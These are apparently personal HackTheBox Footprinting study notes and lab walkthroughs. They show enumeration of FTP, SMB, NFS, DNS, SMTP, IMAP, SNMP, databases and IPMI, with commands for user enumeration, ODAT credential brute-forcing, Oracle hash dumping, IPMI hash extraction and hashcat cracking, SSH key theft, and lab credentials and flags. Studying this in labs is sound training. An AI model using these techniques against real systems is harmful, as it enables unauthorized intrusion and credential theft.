# FTP 
File transfer protocol is often used to share files within an org, it operaters on the application layer, similar to HTTP. Runs natively on port 21. TFTP is simpler than FTP (trivial) and it runs on UDP far more insicure than FTP.
```
Commands	Description
connect	Sets the remote host, and optionally the port, for file transfers.
get	Transfers a file or set of files from the remote host to the local host.
put	Transfers a file or set of files from the local host onto the remote host.
quit	Exits tftp.
status	Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on.
verbose	Turns verbose mode, which displays additional information during file transfer, on or off.
```

Default conf path to see what settings are availeble can be found at **/etc/vsftpd.conf**.

Default location where users are defined to be able to user FTP-
**/etc/ftpusers**
**Dangerous Settings**
```
anonymous_enable=YES	Allowing anonymous login?
anon_upload_enable=YES	Allowing anonymous to upload files?
anon_mkdir_write_enable=YES	Allowing anonymous to create new directories?
no_anon_password=YES	Do not ask anonymous for password?
anon_root=/home/username/ftp	Directory for anonymous.
write_enable=YES	Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?
```
if anon login is allowed the following command can be used to dowload all files
```bash
 wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```
# SMB Shares
```bash
└─$ sudo nmap -sC -sV  10.129.202.5 
445/tcp  open  netbios-ssn Samba smbd 4
└─$ smbmap -H 10.129.202.5                   
        sambashare                                              READ ONLY       InFreight SMB v3.1
└─$ smbclient //10.129.202.5/sambashare -N
smb: \> ls
  .                                   D        0  Mon Nov  8 08:43:14 2021
  ..                                  D        0  Mon Nov  8 10:53:19 2021
  .profile                            H      807  Tue Feb 25 07:03:22 2020
  contents                            D        0  Mon Nov  8 08:43:45 2021
  .bash_logout                        H      220  Tue Feb 25 07:03:22 2020
  .bashrc                             H     3771  Tue Feb 25 07:03:22 2020

smb: \contents\> ls
  .                                   D        0  Mon Nov  8 08:43:45 2021
  ..                                  D        0  Mon Nov  8 08:43:14 2021
  flag.txt                            N       38  Mon Nov  8 08:43:45 2021
  smb: \contents\> get flag.txt
getting file \contents\flag.txt of size 38 as flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

└─$ ./enum4linux-ng.py 10.129.202.5 -A 
└─$ rpcclient -U "" -N 10.129.202.5
netname: sambashare
        remark: InFreight SMB v3.1
        path:   C:\home\sambauser\
        password:
rpcclient $> exit
```

# nfs

``bash                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ sudo nmap --script nfs* 10.129.202.5 -sV -p111,2049
```

```bash
─$ showmount -e 10.129.202.5                          
Export list for 10.129.202.5:
/var/nfs      10.0.0.0/8
/mnt/nfsshare 10.0.0.0/8
```

```bash 
┌──(kali㉿kali)-[~]
└─$ sudo mount -t nfs 10.129.202.5:/var/nfs ./target -o nolock                                                                               
┌──(kali㉿kali)-[~]
└─$ sudo mount -t nfs 10.129.202.5:/mnt/nfsshare ./target -o nolock                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ cd target                                                                                                                                   
┌──(kali㉿kali)-[~/target]
└─$ tree .
└── flag.txt
1 directory, 1 file
```

# DNS
Doing xone transfers can expose local hosts DNS servers on a internal network





DNS bruteforceing install puredns
```bash
sudo apt install golang -y
go install github.com/d3mondev/puredns/v2@latest
export PATH=$PATH:$HOME/go/bin
sudo apt update
sudo apt install git make gcc -y
git clone https://github.com/blechschmidt/massdns.git
cd massdns
make
sudo cp bin/massdns /usr/local/bin/
```

Puredns command to bruteforce subdomain quickly
```bash
puredns bruteforce /home/kali/SecLists-master/Discovery/DNS/combined_subdomains.txt \
  inlanefreight.htb \
  --resolvers-trusted resolvers.txt \
  --trusted-only \
  --skip-wildcard-filter \
  --skip-sanitize \
  -w resolved.txt
```
**other bruteforce**
```bash
dnsrecon -d inlanefreight.htb -n 10.129.203.75 -D /home/kali/SecLists-master/Discovery/DNS/subdomains-top1million-20000.txt -t brt

└─$ gobuster dns -d inlanefreight.htb -r 10.129.203.75 -w /home/kali/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt 

amass enum -d inlanefreight.htb -brute -recursive -w dns-Jhaddix.txt

└─$ dnsenum --dnsserver 10.129.154.35 --enum -p 0 -s 0 -o subdomains.txt -f /home/kali/SecLists-master/Discovery/DNS/subdomains.txt inlanefreight.htb

```


**Zone Transfers**
```bash
└─$ dig @10.129.203.75 internal.inlanefreight.htb AXFR
└─$ dig axfr internal.inlanefreight.htb @10.129.203.75
```
**Reverse lookuup a domain name**
```bash
dig +short app.inlanefreight.htb @10.129.154.35
```


**SMTP**
The SMTP Footprinting module focuses on understanding how SMTP works, how it is commonly deployed, and how misconfigurations can leak valuable information during enumeration. SMTP is primarily used for sending email and typically runs on port 25, with newer authenticated submissions occurring on ports 587 or 465 using STARTTLS for encryption. By default, SMTP transmits data in plaintext, which makes it an attractive target during reconnaissance.

A key takeaway is that SMTP servers can unintentionally disclose valid system users through commands such as VRFY and EXPN. Depending on server configuration, response codes like 252 may indicate that a mailbox exists, while 550 confirms a user does not exist. However, the module emphasizes that enumeration results should never be blindly trusted, as some servers are configured to return misleading responses. Manual verification and contextual analysis are critical.

The module also highlights the danger of open relay configurations, which allow unauthenticated users to send email through the server. Misconfigured relay settings can enable spam campaigns, spoofed emails, and information leakage. Tools such as telnet, netcat, and Nmap SMTP NSE scripts are used to identify supported commands, authentication mechanisms, and relay behavior.

Overall, the module teaches how SMTP misconfigurations can expose internal usernames, employee accounts, and infrastructure details, making SMTP a valuable early foothold during penetration testing and internal network assessments.

**Key Commands to run on SMTP**
```
Command	Usage	Description
HELO	HELO <hostname>	Initiates the SMTP session and identifies the client to the server.
EHLO	EHLO <hostname>	Extended HELO; lists supported ESMTP features (AUTH, STARTTLS, SIZE, etc.).
MAIL FROM	MAIL FROM:<address>	Specifies the sender’s email address for the message.
RCPT TO	RCPT TO:<address>	Specifies the recipient’s email address; may be used for user enumeration.
DATA	DATA	Begins the email body; message ends with a single period (.) on its own line.
VRFY	VRFY <username>	Verifies whether a mailbox or local user exists on the server.
EXPN	EXPN <mailing-list>	Expands a mailing list into individual recipient addresses.
AUTH	AUTH LOGIN / AUTH PLAIN	Initiates SMTP authentication using encoded credentials.
STARTTLS	STARTTLS	Upgrades an unencrypted SMTP connection to TLS encryption.
RSET	RSET	Resets the current mail transaction without closing the connection.
NOOP	NOOP	Sends a keep-alive request to prevent session timeout.
QUIT	QUIT	Terminates the SMTP session gracefully.
HELP	HELP	Requests a list of supported SMTP commands (often disabled).
```
**Typical responces**
```
🔑 Key Response Codes (Quick Reference)
Code	Meaning
250	Requested action completed successfully
252	User exists but verification is restricted
354	Server ready to receive message data
550	Mailbox does not exist / access denied
503	Bad command sequence
502	Command not implemented\
```

**Banner Grab SMTP version**
```bash
nc -nv 10.10.10.10 25
```

**Enumerate port 25 SMTP**
```bash
sudo nmap 10.129.218.123 -p25 --script smtp-open-relay -v
```

**Connect to SMTP server via 25 and telnet can run commands to enumerate**
```bash
telnet 10.129.218.123 25
```
**While loop to enumerate usernames that are present on the host**
```bash
 while read user; do               
  printf "VRFY %s\r\nQUIT\r\n" "$user" | nc -nv 10.129.218.123 25 | \
  grep -E "550|250|252" | sed "s/^/$user -> /"
done < /home/kali/SecLists-master/Usernames/top-usernames-shortlist.txt
```

# HTB Mail Enumeration + IMAP Email Flag Retrieval — Full End-to-End Summary

## Objective
Enumerate mail services on `10.129.1.2`, authenticate with IMAP using `robin:robin`, locate internal mailboxes, read the stored email, and extract the **flag contained in the email body**.

---

## 1. Initial Service Discovery
Nmap revealed mail services running on the target:

- **110/tcp** → POP3 (`Dovecot pop3d`)
- **993/tcp** → IMAPS (IMAP over TLS)
- **995/tcp** → POP3S (POP3 over TLS)

POP3 capabilities included:
`CAPA PIPELINING STLS UIDL RESP-CODES SASL TOP AUTH-RESP-CODE`

TLS certificate enumeration showed:
- `CN=dev.inlanefreight.htb`
- `emailAddress=cto.dev@dev.inlanefreight.htb`
- Self-signed certificate with long validity

This confirmed an internal mail infrastructure using the `inlanefreight.htb` domain.

---

## 2. IMAPS Enumeration with curl (Banner + Auth Validation)
You connected to IMAPS using curl:

```bash
curl -k imaps://10.129.1.2 --user robin:robin -v
```
Results:
```
TLS handshake succeeded
Authentication succeeded
IMAP server greeting banner displayed a flag:
HTB{roncfbw7iszerd7shni7jr2343zhrj}
```

Mailbox listing revealed:
```
INBOX
DEV
DEV.DEPARTMENT
DEV.DEPARTMENT.INT
This confirmed:
Credentials are valid
IMAP is accessible
The interesting mailbox is not INBOX
```

3. IMAP Interactive Session (Protocol-Correct Enumeration)
You switched to an interactive IMAP session using OpenSSL:

```bash
openssl s_client -connect 10.129.1.2:993 -crlf -quiet
```
Then executed proper IMAP commands:
```
A1 LOGIN robin robin
A2 LIST "" *
```
This again confirmed the mailboxes:
```
INBOX
DEV.DEPARTMENT.INT
```
4. Inbox Check (Empty)
You selected the INBOX:
```
A3 SELECT INBOX
Response showed:
0 EXISTS
```
Meaning no emails were stored in INBOX.

5. Selecting the Internal Department Mailbox
You correctly selected the internal mailbox:
```bash
A4 SELECT DEV.DEPARTMENT.INT
```
Response showed:
1 EXISTS
```
Meaning one email is present in this mailbox.

6. Reading the Email Header
You fetched the email headers:
```
A5 FETCH 1 BODY[HEADER]
Header contents:
yaml
Copy code
Subject: Flag
To: Robin <robin@inlanefreight.htb>
From: CTO <devadmin@inlanefreight.htb>
Date: Wed, 03 Nov 2021 16:13:27 +0200
This revealed:
Internal admin email address: devadmin@inlanefreight.htb
The email is explicitly titled “Flag”
```
7. Reading the Email Body (Actual Flag)
You then fetched the email body:
```A6 FETCH 1 BODY[TEXT]
Email body contained the actual required flag:
HTB{983uzn8jmfgpd8jmof8c34n7zio}```
8. Final Result
The correct flag retrieved from inside the IMAP email body is:
```HTB{983uzn8jmfgpd8jmof8c34n7zio}
Key Takeaways
Banner flags ≠ task flags (HTB often differentiates)
```

INBOX may be empty; enumerate all mailboxes
Use protocol-correct commands (IMAP ≠ POP3)
Internal mailboxes often contain sensitive data
Fetching BODY[TEXT] is required to read actual message content

**SNMP**
The SNMP module explains how the Simple Network Management Protocol is used to monitor and manage networked devices such as routers, switches, servers, and IoT systems. SNMP operates primarily over UDP port 161 for queries and configuration changes, while traps are sent asynchronously from servers to clients over UDP port 162 when specific events occur. Central to SNMP is the Management Information Base (MIB), a standardized, hierarchical structure written in ASN.1 that defines Object Identifiers (OIDs). OIDs uniquely identify pieces of information on a device and allow clients to query system details in a consistent way across vendors.

The module compares SNMP versions, highlighting that SNMPv1 and SNMPv2c lack encryption and rely on plaintext community strings for access control, making them insecure and attractive targets for attackers. SNMPv3 significantly improves security through authentication and encryption but is more complex to configure, which leads many organizations to continue using older versions.

From an offensive perspective, the module demonstrates how misconfigurations—such as default or weak community strings and read/write access—can expose sensitive system information. Tools like snmpwalk, onesixtyone, and braa are used to enumerate OIDs, brute-force community strings, and extract data such as hostnames, installed software, and administrator contact details. The module emphasizes that SNMP can be both a powerful administrative tool and a serious security risk when improperly configured.

SNMP walk was able to enumerate the version of SNMP, the admin contact and a custom script that was running on a server. Very powerfull enumeration tool.

```bash
snmpwalk -v2c -c public 10.129.192.69
```

# My SQL
This section covers MySQL service enumeration and basic database interaction from a penetration testing perspective. MySQL is a widely used open-source relational database management system that follows a client-server model, commonly deployed in LAMP/LEMP stacks to store application data such as users, credentials, emails, and customer records. Because databases often contain sensitive information, misconfigurations—such as weak credentials or external exposure—can lead to serious security risks.

During enumeration, MySQL services are typically identified on TCP port 3306 using tools like Nmap, which can reveal version information, authentication plugins, and potential misconfigurations. However, scan results must always be manually validated, as false positives are common. Once valid credentials are obtained, attackers can authenticate using the MySQL client and enumerate databases, tables, and columns using standard SQL commands like SHOW DATABASES, USE, and SELECT.

In this assessment, weak credentials (robin:robin) allowed successful access to a remotely exposed MySQL server running MySQL 8.0.27. Inside the customers database, a table named myTable contained customer data, including names and email addresses. By querying the name column with pattern matching, the email address for the customer Otto Lang was retrieved as ultrices@google.htb
.

This exercise demonstrates how weak authentication and exposed database services can directly lead to sensitive data disclosure.
``` python
# MySQL Enumeration & Data Extraction – Command List

# Scan MySQL service and enumerate version/auth info
nmap -sV -sC -p3306 --script mysql* <TARGET_IP>
# Identifies MySQL service, version, auth plugin, and potential misconfigurations

# Connect to MySQL using discovered weak credentials (disable SSL verification)
mysql -h <TARGET_IP> -u robin -p --ssl-mode=DISABLED
# Authenticates to the remote MySQL server despite self-signed TLS certificate

# Show MySQL server version
SELECT version();
# Confirms exact MySQL version in use

# List all databases on the server
SHOW DATABASES;
# Enumerates accessible databases

# Select the customers database
USE customers;
# Switches context to the target database

# List tables in the customers database
SHOW TABLES;
# Reveals available tables holding data

# Inspect table structure
DESCRIBE myTable;
# Displays columns, data types, and schema for customer data

# Search for the customer Otto Lang by name
SELECT name, email
FROM myTable
WHERE name LIKE '%Otto%' AND name LIKE '%Lang%';
# Retrieves the email address associated with Otto Lang
```
MYSQL section
enumeration of mysql server can be done via nmap, which will show hostnames of the server.

From there you can connect to it via the username and password. If you have it. You can also run the following to enumerate the non default databases.
Connect to SQL server via python/impacket
```bash
└─$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py backdoor@10.129.230.249 -windows-auth                      
```
Enumerate non default databases (anything over 4 will be non standard)
```sql
SELECT name FROM sys.databases WHERE database_id > 4;
```

Enumerating and Brute forcing TNS orcal databases
**Summary**
This module introduces Oracle Transparent Network Substrate (TNS), the core communication protocol used by Oracle databases to handle client connections, name resolution, load balancing, and secure data transport. TNS typically listens on TCP port 1521 and is widely deployed in enterprise environments such as healthcare, finance, and retail due to its scalability and built-in encryption capabilities.

Two configuration files are central to Oracle networking: tnsnames.ora (client-side) and listener.ora (server-side). The tnsnames.ora file maps service names or SIDs to network addresses, while listener.ora defines which database instances the listener exposes and how it behaves. Understanding these files is critical because attackers must identify a valid SID or service name before authenticating to an Oracle database.

A key concept is the System Identifier (SID), which uniquely identifies a database instance. If an incorrect SID is supplied, connections fail. SIDs can often be enumerated using tools like Nmap (oracle-sid-brute) or ODAT. Many Oracle installations still rely on predictable or default SIDs such as XE or ORCL.

The module emphasizes ODAT (Oracle Database Attacking Tool) as the primary enumeration and exploitation framework. ODAT can identify valid credentials, enumerate users, extract password hashes, upload files, and exploit misconfigurations. A critical account highlighted is DBSNMP, used by Oracle monitoring services and historically configured with weak or default credentials (dbsnmp:dbsnmp). Gaining access to this account often allows attackers to extract password hashes from SYS.USER$.

Once authenticated, attackers may escalate privileges (e.g., SYSDBA), dump password hashes for offline cracking, or abuse database packages to read/write files or execute commands, depending on permissions. The module demonstrates file upload via UTL_FILE and validation through HTTP access.

Overall, the module’s core takeaway is that Oracle security failures often stem from weak defaults, exposed TNS listeners, and poor account hygiene, making systematic enumeration of SIDs, users, and hashes the most effective attack path.

Installing ODAT
```bash
# 1) Base deps + libaio (Kali rolling uses libaio1t64)
sudo apt update
sudo apt install -y python3 python3-pip python3-venv unzip git libaio1t64

# 2) libaio compatibility symlink (Instant Client expects libaio.so.1)
sudo ln -sf /lib/x86_64-linux-gnu/libaio.so.1t64 /lib/x86_64-linux-gnu/libaio.so.1
sudo ldconfig

# 3) Download + extract Oracle Instant Client 21.4
cd ~/odat
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
unzip -o instantclient-basic-linux.x64-21.4.0.0.0dbru.zip

# 4) Install Instant Client to /opt/oracle + register linker path
sudo mkdir -p /opt/oracle
sudo rm -rf /opt/oracle/*
sudo mv instantclient_*/* /opt/oracle/
echo "/opt/oracle" | sudo tee /etc/ld.so.conf.d/oracle-instantclient.conf
sudo ldconfig

# 5) Set Oracle env vars for zsh + load them
cat >> ~/.zshrc << 'EOF'

# Oracle Instant Client (ODAT)
export ORACLE_HOME=/opt/oracle
export LD_LIBRARY_PATH=/opt/oracle:$LD_LIBRARY_PATH
export PATH=/opt/oracle:$PATH
EOF
source ~/.zshrc

# 6) Create + activate venv (PEP 668)
cd ~/odat
python3 -m venv .venv
source .venv/bin/activate

# 7) Install ODAT Python deps inside venv
pip install --upgrade pip
pip install cx_Oracle python-libnmap pycryptodome passlib pyasyncore

# 8) Run ODAT
python odat.py -h

```

Command to enumerate for passwords on oracle server
```bash
└─$ python odat.py all -s 10.129.205.19
```
that gives us scott from there can login to the server with scott
```bash
└─$ sqlplus scott/tiger@10.129.205.19/XE as sysdba 
```
pull the hashes for the other accounts
```sql
SQL> select name, password from sys.user$;
```

The Intelligent Platform Management Interface (IPMI) is a standardized protocol used for out-of-band management of servers through a dedicated hardware component called the Baseboard Management Controller (BMC). IPMI operates independently of the host operating system, BIOS, CPU, and firmware, allowing administrators to manage systems even when they are powered off, unresponsive, or experiencing hardware failures. Common management capabilities include power control, BIOS configuration, hardware monitoring, remote console access, and operating system reinstallation.

IPMI typically communicates over UDP port 623 and is widely implemented by enterprise vendors such as Dell (iDRAC), HP (iLO), and Supermicro. Because BMCs have near-physical access to the system, unauthorized access to IPMI represents a critical security risk. During internal penetration tests, exposed IPMI interfaces are frequently discovered on internal networks, often with weak or default credentials.

Footprinting IPMI begins by identifying UDP port 623 using Nmap and fingerprinting the service with the ipmi-version NSE script to determine protocol version and authentication capabilities. Most modern systems use IPMI version 2.0, which is vulnerable to a design flaw in the RAKP authentication protocol. During authentication, the BMC sends a salted SHA1 or MD5 password hash to the client before verifying credentials. This behavior allows an attacker to extract password hashes for valid IPMI users without authentication.

Tools such as Metasploit’s ipmi_dumphashes module can retrieve these hashes, which can then be cracked offline using Hashcat mode 7300. Many IPMI passwords are short, default, or reused across systems, making them highly susceptible to cracking. Successful compromise of IPMI credentials often leads to full system control and can enable further lateral movement through credential reuse.

Because the vulnerability is inherent to the IPMI specification, mitigation relies on strong, unique passwords, strict network segmentation, and limiting access to BMC interfaces. IPMI should always be assessed during internal penetration tests due to its prevalence and high-impact risk.


```metsploit
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS 10.129.165.125
RHOSTS => 10.129.165.125
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
[+] 10.129.165.125:623 - IPMI - Hash found: admin:5fb6b4368200000014169993b700e0247cf284945e641d04fc2fa8c1a843571ea630f7c4cf0881cfa123456789abcdefa123456789abcdef140561646d696e:af7111ffff02850dacc29c9ac2e18868f97ab6fd
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > 
```

```bash
┌──(kali㉿kali)-[~]
└─$ echo "5fb6b4368200000014169993b700e0247cf284945e641d04fc2fa8c1a843571ea630f7c4cf0881cfa123456789abcdefa123456789abcdef140561646d696e:af7111ffff02850dacc29c9ac2e18868f97ab6fd" > password.txt
                                   
┌──(kali㉿kali)-[~]
└─$ cat password.txt        
5fb6b4368200000014169993b700e0247cf284945e641d04fc2fa8c1a843571ea630f7c4cf0881cfa123456789abcdefa123456789abcdef140561646d696e:af7111ffff02850dacc29c9ac2e18868f97ab6fd
                                    
┌──(kali㉿kali)-[~]
└─$ hashcat -m 7300 password.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting
```

# Footprinting Lab1
I started by scanning the target to understand what was exposed and to stay within the “careful enumeration” rule. The initial service discovery showed two FTP services (21 and 2121), SSH on 22, and DNS on 53, which suggested a credential/key-based path rather than web exploitation.
```bash
nmap -sC -sV 10.129.157.210

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
2121/tcp open  ftp     ProFTPD
```
Next I tested FTP on port 21 using the provided credentials to see if it exposed any useful files (like an SSH key). Authentication worked, but directory listing showed only . and .., meaning the FTP root was effectively empty. I also confirmed that wget could only retrieve a .listing file and would not download anything else because there were no regular files available.
```bash

ftp 10.129.157.210

220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.157.210]
Name (10.129.157.210:kali): ceil
331 Password required for ceil
230 User ceil logged in

ftp> pwd
ftp> ls -la

Remote directory: /
drwxr-xr-x   2 root root 4096 Nov 10  2021 .
drwxr-xr-x   2 root root 4096 Nov 10  2021 ..

wget -m --no-passive ftp://ceil:qwer1234@10.129.157.210
cat 10.129.157.210/.listing

drwxr-xr-x   2 root root 4096 Nov 10  2021 .
drwxr-xr-x   2 root root 4096 Nov 10  2021 ..
```

After that I attempted SSH directly with the username to validate whether password auth was allowed. The verbose output showed SSH only permitted publickey authentication, which aligned with the lab hint about employees discussing SSH keys. This confirmed I needed to obtain a private key rather than brute forcing or using password authentication.
```bash

ssh -vvv ceil@10.129.157.210

debug1: Authentications that can continue: publickey
ceil@10.129.157.210: Permission denied (publickey).
```

I then validated DNS quickly to see if it leaked any internal zone information that could point to files, hostnames, or other services. The server disclosed its version and allowed a zone transfer only for localhost, but all other likely zones failed, and dnsenum did not return useful NS/domain info. That told me DNS wasn’t going to provide the SSH key or a new path to the flag in this lab.
```bash

dig @10.129.157.210 version.bind chaos txt
dig @10.129.157.210 axfr localhost
dig @10.129.157.210 axfr local
dig @10.129.157.210 axfr internal
dig @10.129.157.210 axfr htb
dnsenum 10.129.157.210

version.bind. 0 CH TXT "9.16.1-Ubuntu"

; Transfer failed.   (for local/internal/htb)
```

Since port 21 FTP was empty and SSH required keys, the remaining “careful” pivot was the second FTP service on port 2121. Logging in there immediately exposed ceil’s home directory contents, including a .ssh directory. Trying to get .ssh failed because it’s not a regular file, so I changed into the directory, listed its contents, and found id_rsa, id_rsa.pub, and authorized_keys. I downloaded the private key and the authorized_keys file.
```bash

ftp 10.129.157.210 2121

ftp> ls -la

drwxr-xr-x   4 ceil ceil 4096 Nov 10  2021 .
drwxr-xr-x   4 ceil ceil 4096 Nov 10  2021 ..
-rw-------   1 ceil ceil  294 Nov 10  2021 .bash_history
-rw-r--r--   1 ceil ceil  220 Nov 10  2021 .bash_logout
-rw-r--r--   1 ceil ceil 3771 Nov 10  2021 .bashrc
drwx------   2 ceil ceil 4096 Nov 10  2021 .cache
-rw-r--r--   1 ceil ceil  807 Nov 10  2021 .profile
drwx------   2 ceil ceil 4096 Nov 10  2021 .ssh
-rw-------   1 ceil ceil  759 Nov 10  2021 .viminfo

ftp> get .ssh

550 .ssh: Not a regular file

ftp> cd .ssh
ftp> ls -la

drwx------   2 ceil ceil 4096 Nov 10  2021 .
drwxr-xr-x   4 ceil ceil 4096 Nov 10  2021 ..
-rw-rw-r--   1 ceil ceil  738 Nov 10  2021 authorized_keys
-rw-------   1 ceil ceil 3381 Nov 10  2021 id_rsa
-rw-r--r--   1 ceil ceil  738 Nov 10  2021 id_rsa.pub

ftp> get id_rsa
ftp> get authorized_keys
ftp> bye
```

With the private key downloaded locally, I fixed its permissions (required by SSH), then authenticated successfully to SSH using the key. This achieved the shell as ceil without any exploitation, matching the lab constraints.
```bash
chmod 600 id_rsa
ssh -i id_rsa ceil@10.129.157.210
```

Once on the host, I attempted to use locate to quickly find flag.txt, but the utility was not installed. I then enumerated /home, noticed a directory named flag, and found flag.txt directly inside it. Reading the file produced the flag required for submission.
```bash

locate flag.txt

Command 'locate' not found, but can be installed with:
apt install mlocate

cd /home
ls
cd flag
ls
cat flag.txt

HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
```
# Footprinting Lab2
```bash
┌──(kali㉿kali)-[~]
└─$ cat important.txt                      
sa:87N1ns@slls83      


ORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind?
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|_  100005  1,2,3       2049/udp6  mountd
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-01-09T01:17:50+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=WINMEDIUM
| Not valid before: 2026-01-08T00:16:18
|_Not valid after:  2026-07-10T00:16:18
| rdp-ntlm-info: 
|   Target_Name: WINMEDIUM
|   NetBIOS_Domain_Name: WINMEDIUM
|   NetBIOS_Computer_Name: WINMEDIUM
|   DNS_Domain_Name: WINMEDIUM
|   DNS_Computer_Name: WINMEDIUM
|   Product_Version: 10.0.17763
|_  System_Time: 2026-01-09T01:17:40+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-09T01:17:45
|_  start_date: N/A
|_clock-skew: mean: -3s, deviation: 0s, median: -3s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.92 seconds

─(kali㉿kali)-[~]
└─$ sudo cat target/ticket4238791283782.
 2    host=smtp.web.dev.inlanefreight.htb
 3    #port=25
 4    ssl=true
 5    user="alex"
 6    password="lol123!mD"
 7    from="alex.g@web.dev.inlanefreight.htb"


└─$ xfreerdp3 /v:10.129.202.41 /u:alex /p:'lol123!mD' /cert:ignore /sec:nla
```
Once you find the password on the dev folder in important.txt you can rdp into the host with that password and account name.
```bash
└─$ xfreerdp3 /u:administrator /p:'87N1ns@slls83' /v:10.129.202.41         
```

From there you connect to the MSSQL server and you can dump the HTB user and pass via --
```sql
SELECT name FROM sys.databases;
USE accounts;
GO

SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME
FROM INFORMATION_SCHEMA.COLUMNS
WHERE COLUMN_NAME LIKE '%user%'
   OR COLUMN_NAME LIKE '%login%'
   OR COLUMN_NAME LIKE '%pass%'
   OR COLUMN_NAME LIKE '%pwd%'
   OR COLUMN_NAME LIKE '%cred%'
ORDER BY TABLE_NAME;

SELECT TOP 200 * FROM dbo.devsacc;
```
Boom flag.

# Footprinting Lab3 Hard

Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.
    onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.147.148
	    #backup
	    #commnity is backup
    
    braa backup@10.129.147.148:.1.3.6.*
        10.129.147.148:82ms:.80:tom NMds732Js2761

    openssl s_client -connect 10.129.147.148:imaps
        #find email with ssh key
        	1 SELECT INBOX
                * OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
                * 1 EXISTS
                * 0 RECENT
            1 FETCH 1 all

            1 LIST * *
            1 FETCH 1 body[text]
                #found ssh key

    ssh -i tom_id_rsa tom@10.129.147.148
        cat .bash_history   (shows mysql)
    mysql -u tom -p
        use users;
        select * from users where username like 'HTB';
        
    cr3n4o7rzse7rzhnckhssncif7ds